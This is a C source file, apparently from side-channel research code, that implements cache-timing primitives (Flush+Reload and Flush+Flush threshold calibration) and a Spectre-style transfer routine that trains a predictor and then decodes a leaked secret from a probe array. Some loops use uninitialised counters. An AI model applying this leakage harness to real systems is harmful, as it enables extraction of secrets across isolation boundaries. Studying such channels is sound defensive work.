#include "../include/transfer.h"

size_t access_flushed(uint8_t *address)
{
    clflush(address);
    lfence();
    mfence();
    return access_time(address);
}

size_t access_cached(uint8_t *address)
{
    maccess(address);
    lfence();
    mfence();
    return access_time(address);
}

size_t flush_flushed(uint8_t *address)
{
    clflush(address);
    lfence();
    mfence();
    return flush_time(address);
}

size_t flush_cached(uint8_t *address)
{
    maccess(address);
    lfence();
    mfence();
    return flush_time(address);
}

size_t get_average_time(size_t (*function_to_measure)(uint8_t *address))
{
    uint8_t addresses[NUMBER_OF_THRESHOLD_MEASUREMENTS*STRIDE];

    size_t measurements[NUMBER_OF_THRESHOLD_MEASUREMENTS];

    for (size_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
    {
        measurements[i] = function_to_measure(addresses + (i * STRIDE));
    }

    size_t sum = 0;
    for (size_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
    {
        sum += measurements[i];
        //printf("Flushed: %i\n", measurements[i]);
    }

    return sum / NUMBER_OF_THRESHOLD_MEASUREMENTS;
}

size_t get_threshold(uint8_t covert_channel)
{
    if (covert_channel == 0)
    {
        return get_average_time(access_flushed) - get_average_time(access_cached);
    }
    else if (covert_channel == 1)
    {
        return get_average_time(flush_flushed) - get_average_time(flush_cached);
    }
}

bool is_cached_load(uint8_t *address, size_t threshold)
{
    size_t time = access_time(address);
    //lfence();
    //mfence();
    //printf("Address %zx cycles: %zu\n", address, time);
    if (time < threshold)
        return true;
    return false;
}

uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len,
                        uint64_t secret, uint8_t channel[],
                        uint8_t bits_count, uint64_t stride),
                  uint64_t (*decode)(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold),
         uint64_t in, size_t threshold, uint8_t bits_count, uint64_t stride, uint64_t train_data_length)
{
    // creating transfer array
    uint8_t side_channel[((bits_count + 1) * stride) + 4096];
    uint32_t out_index = 0;
    bool training;

    uint32_t train_data[train_data_length * stride];
    for (uint32_t i; i < train_data_length * stride; i++)
    {
        train_data[i] = i+1;
    }

    // empty the output
    uint64_t out = 0;

    memset(side_channel,5, ((bits_count + 1) * stride) + 4096);

    for (uint32_t i; i < train_data_length * stride; i++)
        clflush(&train_data[i]);

    // flushing the transfer array, before encoding data into it
    for (uint32_t i = 0; i < ((bits_count + 1) * stride) + 4096; i++)
        clflush(&side_channel[i]);

    maccess(&in);

    lfence();
    mfence();

    // training the predictor
    if (train_data_length > 0)
    {
        for (uint32_t i = 0; i < (train_data_length * stride) - 1; i += stride)
        {
            // using 0 as secret, so no adresses are loaded into cache
            training = leak_data(i, train_data, train_data_length * stride, 0, side_channel+4096, bits_count, stride);
            //printf("Training: %d\n", training);
        }
    }

    // writing secret into the side channel array
    training = leak_data((train_data_length * stride), train_data, train_data_length * stride, in, side_channel+4096, bits_count, stride);
    printf("Training: %d\n", training);

    return decode(side_channel + 4096, bits_count, stride, threshold);
}